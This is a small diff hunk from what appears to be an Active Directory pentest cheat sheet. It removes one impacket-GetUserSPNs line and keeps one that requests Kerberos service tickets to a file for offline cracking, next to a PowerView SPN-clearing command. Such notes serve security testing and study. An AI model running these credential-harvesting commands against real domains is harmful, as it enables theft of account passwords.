@@ -639,7 +639,6 @@ Set-DomainObject -Credential $CredSPN -Identity <USER> -Clear <SPN_NAME> -Verbos
 
 ```bash
 # Enum users and collect tickets
-impacket-GetUserSPNs -dc-ip <DC_IP> <DOMAIN>/<USER>
 impacket-GetUserSPNs -dc-ip <DC_IP> <DOMAIN>/<USER> -request -outputfile spn_tickets.txt
 ```
 
